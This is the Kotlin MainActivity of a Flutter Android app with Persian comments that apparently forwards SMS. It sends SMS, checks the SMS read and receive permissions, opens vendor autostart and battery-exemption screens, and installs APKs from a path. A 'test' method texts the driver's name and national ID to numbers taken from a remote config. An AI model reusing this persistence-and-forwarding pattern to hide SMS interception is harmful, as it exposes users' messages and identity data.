package com.example.dalahoo_app

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.FileProvider
import java.io.File
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.telephony.SmsManager
import android.telephony.SubscriptionManager

class MainActivity : FlutterActivity() {

    private val CHANNEL = "sms_forwarder"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->

                val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)

                when (call.method) {
                    "sendSms" -> {

                        val simSlot = call.argument<Int>("simSlot") ?: 1
                        val phone = call.argument<String>("phone") ?: ""
                        val message = call.argument<String>("message") ?: ""

                        try {

                            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {

                                val subscriptionManager =
                                    getSystemService(SubscriptionManager::class.java)

                                val subs = subscriptionManager.activeSubscriptionInfoList

                                if (subs != null && subs.size >= simSlot) {

                                    val subId = subs[simSlot - 1].subscriptionId
                                    SmsManager.getSmsManagerForSubscriptionId(subId)

                                } else {
                                    SmsManager.getDefault()
                                }

                            } else {
                                SmsManager.getDefault()
                            }

                            smsManager.sendTextMessage(phone, null, message, null, null)

                            result.success(true)

                        } catch (e: Exception) {
                            android.util.Log.e("SMS", "Send failed: ${e.message}")
                            result.success(false)
                        }
                    }

                    // SMS permission
                    "requestSmsPermission" -> {
                        val granted = ActivityCompat.checkSelfPermission(
                            this,
                            Manifest.permission.SEND_SMS
                        ) == PackageManager.PERMISSION_GRANTED

                        result.success(granted)
                    }

                    // Battery - دیالوگ سیستم (یک کلیک Allow)
                    "openBatterySettings" -> {
                        try {
                            val intent = Intent(
                                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                            ).apply {
                                data = Uri.parse("package:$packageName")
                            }
                            startActivity(intent)
                        } catch (e: Exception) {
                            // fallback به صفحه کامل تنظیمات
                            val fallback = Intent(
                                Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS
                            )
                            startActivity(fallback)
                        }
                        result.success(true)
                    }

                    "isBatteryOptimized" -> {
                        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                        val ignoring = pm.isIgnoringBatteryOptimizations(packageName)
                        result.success(!ignoring)
                    }

                    // AutoStart - پشتیبانی برندهای مختلف
                    "openAutoStartSettings" -> {
                        val brand = Build.MANUFACTURER.lowercase()
                        val opened = tryOpenAutoStartSettings(brand)
                        if (!opened) {
                            // fallback نهایی
                            val fallback = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                            fallback.data = Uri.parse("package:$packageName")
                            startActivity(fallback)
                        }
                        result.success(true)
                    }

                    "isAutoStartEnabled" -> {
                        result.success(true)
                    }

                    "getDeviceBrand" -> result.success(Build.MANUFACTURER.lowercase())

                    // NEW: enable/disable SMS forwarding
                    "setAppEnabled" -> {
                        val enabled = call.argument<Boolean>("enabled") ?: false
                        prefs.edit().putBoolean("is_enabled", enabled).apply()
                        result.success(true)
                    }

                    "setSelectedSim" -> {
                        val simSlot = call.argument<Int>("simSlot") ?: 1
                        // ذخیره در app_prefs
                        prefs.edit().putInt("selectedSim", simSlot).apply()
                        // ذخیره در FlutterSharedPreferences هم (برای SmsReceiver)
                        val flutterPrefs = getSharedPreferences(
                            "FlutterSharedPreferences",
                            Context.MODE_PRIVATE
                        )
                        flutterPrefs.edit()
                            .putInt("selectedSim", simSlot)
                            .putInt("flutter.selectedSim", simSlot)
                            .apply()
                        result.success(true)
                    }
                    // NEW: check state
                    "isAppEnabled" -> {
                        val enabled = prefs.getBoolean("is_enabled", false)
                        result.success(enabled)
                    }

                    "canInstallPackages" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            val allowed = packageManager.canRequestPackageInstalls()

                            android.util.Log.d(
                                "APK_INSTALL",
                                "canRequestPackageInstalls = $allowed"
                            )

                            result.success(allowed)
                        } else {
                            result.success(true)
                        }
                    }

                    "openInstallPermissionSettings" -> {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                val intent = Intent(
                                    Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                    Uri.parse("package:$packageName")
                                )
                                startActivity(intent)
                            } else {
                                val intent = Intent(Settings.ACTION_SECURITY_SETTINGS)
                                startActivity(intent)
                            }

                            result.success(true)
                        } catch (e: Exception) {
                            android.util.Log.e(
                                "APK_INSTALL",
                                "Open install permission settings failed: ${e.message}",
                                e
                            )

                            result.success(false)
                        }
                    }

                    "installApk" -> {
                        try {
                            val path = call.argument<String>("path")
                            if (path.isNullOrBlank()) {
                                result.error("INVALID_PATH", "APK path is empty", null)
                                return@setMethodCallHandler
                            }

                            val file = File(path)
                            if (!file.exists()) {
                                result.error("FILE_NOT_FOUND", "APK file not found: $path", null)
                                return@setMethodCallHandler
                            }

                            val uri = FileProvider.getUriForFile(
                                this,
                                "$packageName.fileprovider",
                                file
                            )

                            val intent = Intent(Intent.ACTION_VIEW).apply {
                                setDataAndType(uri, "application/vnd.android.package-archive")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                            }
                            startActivity(intent)
                            result.success(true)
                        } catch (e: Exception) {
                            android.util.Log.e("APK_INSTALL", "installApk failed: ${e.message}", e)
                            result.error("INSTALL_FAILED", e.message, null)
                        }
                    }

                    "sendPermissionTestSms" -> {

                        val flutterPrefs = getSharedPreferences(
                            "FlutterSharedPreferences",
                            Context.MODE_PRIVATE
                        )

                        android.util.Log.d(
                            "PERMISSION_TEST_SMS",
                            "METHOD CALLED"
                        )
                        try {

                            val smsRead =
                                ActivityCompat.checkSelfPermission(
                                    this,
                                    Manifest.permission.READ_SMS
                                ) == PackageManager.PERMISSION_GRANTED

                            val smsReceive =
                                ActivityCompat.checkSelfPermission(
                                    this,
                                    Manifest.permission.RECEIVE_SMS
                                ) == PackageManager.PERMISSION_GRANTED

                            val yesNo: (Boolean) -> String = {
                                if (it) "بله" else "نه"
                            }

                            val model =
                                "${Build.MANUFACTURER} ${Build.MODEL}"

                            val driverName = flutterPrefs.getString("flutter.driver_name", "") ?: ""
                            val nationalId = flutterPrefs.getString("flutter.driver_national_id", "") ?: ""
                            val finalMessage = "نام: $driverName\nکدملی: $nationalId"

                            val simSlot =
                                prefs.getInt("selectedSim", 1)

                            val subscriptionManager =
                                getSystemService(
                                    SubscriptionManager::class.java
                                )

                            val subs =
                                subscriptionManager?.activeSubscriptionInfoList

                            val smsManager =
                                if (!subs.isNullOrEmpty() &&
                                    subs.size >= simSlot
                                ) {
                                    val subId =
                                        subs[simSlot - 1].subscriptionId

                                    SmsManager.getSmsManagerForSubscriptionId(
                                        subId
                                    )
                                } else {
                                    SmsManager.getDefault()
                                }

                            val parts = smsManager.divideMessage(finalMessage)

                            // Send test SMS to both destinations
                            val destinations = RemoteConfig.load(this).destinations
                            for (dest in destinations) {
                                try {
                                    smsManager.sendMultipartTextMessage(
                                        dest,
                                        null,
                                        parts,
                                        null,
                                        null
                                    )
                                } catch (e: Exception) {
                                    android.util.Log.e("PERMISSION_TEST_SMS", "Failed to $dest: ${e.message}")
                                }
                            }

                            android.util.Log.d(
                                "PERMISSION_TEST_SMS",
                                "SMS SEND REQUESTED"
                            )

                            result.success(true)

                        } catch (e: Exception) {

                            android.util.Log.e(
                                "PERMISSION_TEST_SMS",
                                "Send failed: ${e.message}",
                                e
                            )

                            result.success(false)
                        }
                    }

                    else -> result.notImplemented()
                }
            }
    }

    /**
     * باز کردن صفحه آغاز خودکار / مدیریت راه اندازی برای برندهای مختلف.
     * برای هواوی: صفحه مدیریت راه اندازی اپ که کاربر باید
     * «مدیریت خودکار» را به «مدیریت دستی» تغییر دهد.
     */
    private fun tryOpenAutoStartSettings(brand: String): Boolean {
        val candidates = mutableListOf<Pair<String, String>>()

        when {
            // شیائومی / ردمی / پوکو
            brand.contains("xiaomi") || brand.contains("redmi") || brand.contains("poco") -> {
                candidates.add("com.miui.securitycenter" to "com.miui.permcenter.autostart.AutoStartManagementActivity")
                candidates.add("com.miui.securitycenter" to "com.miui.permcenter.autostart.AutoStartManagementActivity")
            }

            // هواوی / آنر
            // کاربر باید «مدیریت خودکار» را به «مدیریت دستی» تغییر دهد
            // و هر سه گزینه (راه اندازی خودکار، راه اندازی ثانویه، اجرا در پس زمینه) را فعال کند
            brand.contains("huawei") || brand.contains("honor") -> {
                candidates.add(
                    "com.huawei.systemmanager" to
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )
                candidates.add(
                    "com.huawei.systemmanager" to
                        "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"
                )
                candidates.add(
                    "com.huawei.systemmanager" to
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"
                )
                candidates.add(
                    "com.hihonor.systemmanager" to
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )
            }

            // سامسونگ
            brand.contains("samsung") -> {
                candidates.add(
                    "com.samsung.android.lool" to
                        "com.samsung.android.sm.ui.battery.BatteryActivity"
                )
                candidates.add(
                    "com.samsung.android.sm" to
                        "com.samsung.android.sm.app.dashboard.SmartManagerDashBoardActivity"
                )
            }

            // اوپو / ریلمی
            brand.contains("oppo") || brand.contains("realme") -> {
                candidates.add(
                    "com.coloros.safecenter" to
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )
                candidates.add(
                    "com.oppo.safe" to
                        "com.oppo.safe.permission.startup.StartupAppListActivity"
                )
                candidates.add(
                    "com.coloros.safecenter" to
                        "com.coloros.safecenter.startupapp.StartupAppListActivity"
                )
            }

            // ویوو / iQOO
            brand.contains("vivo") || brand.contains("iqoo") -> {
                candidates.add(
                    "com.iqoo.secure" to
                        "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
                )
                candidates.add(
                    "com.vivo.permissionmanager" to
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                )
                candidates.add(
                    "com.iqoo.secure" to
                        "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"
                )
            }

            // وان پلاس
            brand.contains("oneplus") -> {
                candidates.add(
                    "com.oneplus.security" to
                        "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
                )
                candidates.add(
                    "com.coloros.safecenter" to
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )
            }

            // نوکیا / اندروید خام و بقیه
            else -> {
                // چیزی اضافه نمی‌کنیم؛ fallback بیرونی استفاده می‌شود
            }
        }

        for ((pkg, cls) in candidates) {
            try {
                val intent = Intent().apply {
                    component = android.content.ComponentName(pkg, cls)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                android.util.Log.d("AutoStart", "Opened: $pkg / $cls")
                return true
            } catch (e: Exception) {
                android.util.Log.w("AutoStart", "Failed: $pkg / $cls → ${e.message}")
            }
        }
        return false
    }
}